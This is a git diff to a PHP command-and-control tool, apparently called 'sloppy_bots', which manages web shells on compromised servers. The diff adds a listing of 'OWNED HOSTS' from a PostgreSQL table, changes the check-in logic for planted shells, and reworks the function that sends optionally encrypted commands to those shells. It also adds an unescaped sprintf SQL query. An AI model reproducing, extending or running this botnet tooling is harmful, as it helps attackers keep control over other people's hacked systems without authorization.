@@ -11,7 +11,7 @@ $cof = array(
     "proxy" => "",
     "host" => "127.0.0.1",
     "port" => "5432",
-    "username" => "notroot",
+    "username" => "postgres",
     "password" => "",
     "dbname" => "sloppy_bots"
 );
@@ -196,8 +196,6 @@ function rev($host, $shell, $port, $os)
 
 function co($command, $host, $uri, bool $encrypt)
 {
-    $space_Safe_coms = null;
-    $cr = null;
     if ($encrypt === true && !is_null($command)) {
         $our_nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
         $secure_Key = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
@@ -211,6 +209,7 @@ function co($command, $host, $uri, bool $encrypt)
             echo $exception->getMessage();
             echo $exception->getTraceAsString();
             echo $exception->getLine();
+            return 0;
         }
     } else {
         $cr = "1";
@@ -232,7 +231,7 @@ function co($command, $host, $uri, bool $encrypt)
                 case 200:
                     return $syst;
                 default:
-                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
+                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
             }
 
         }
@@ -366,10 +365,10 @@ function aHo($host, $os, $checkIn)
 function check($host, $path, $batch)
 {
     $dbC = pg_connect(DBCONN);
-    $c = queryDB($host, $batch);
     if (!empty($batch)) {
         switch ($batch) {
             case "y":
+//                $qc = queryDB($host, $batch);
                 $c = pg_exec($dbC, "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
                 $count = pg_exec($dbC, 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
                 echo "Pulling: " . pg_fetch_row($count) . "\nThis could take awhile.";
@@ -440,6 +439,12 @@ function queryDB($host, $fetchWhat)
         try {
             $dbC = pg_connect(DBCONN);
             switch (strtolower($fetchWhat)) {
+                case "ch":
+                    $row = pg_fetch_all($dbC, "SELECT * FROM sloppy_bots_main");
+                    break;
+                case "chR":
+                    $row = pg_fetch_row($dbC, sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+                    break;
                 case "r":
                     $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'", pg_escape_string($host)));
                     break;
@@ -574,16 +579,31 @@ while ($run) {
         case "ch":
             system(clears);
             try {
-                $h = readline("Who is it we need to check on?\n->");
+                $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main LIMIT 20");
+                $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
+                echo str_repeat("+", 35) . "[ OWNED HOSTS ]" .str_repeat("+", 39)."\n";
+                $a = 0;
+                foreach (pg_fetch_all($axx) as $tem => $use){
+                    print(sprintf("[ ID: ]-> %s [ RHOST: ] -> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
+                        $use['id'],
+                        $use['rhost'],
+                        $use['uri'],
+                        $use['os_flavor'],
+                        $use['check_in']
+
+                    ));
+                }
+                echo str_repeat("+", 35) . "[ END OWNED HOSTS ]" .str_repeat("+", 35)."\n";
                 $b = readline("Is this going to be a batch job?(Y/N)\n->");
                 switch (!empty(strtolower($b))) {
                     case "n":
                         echo "Not executing batch job.\n";
-                        check($h, queryDB($h, "ch"), "n");
+                        $h = readline("Who is it we need to check on?(based on ID)\n->");
+                        check($h, queryDB($h, "chR"), "n");
                         break;
                     case "y":
                         echo "Executing batch job!\n";
-                        check($h, 'b', "y");
+                        check('0', 'b', "y");
                         break;
                     default:
                         logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.\n");
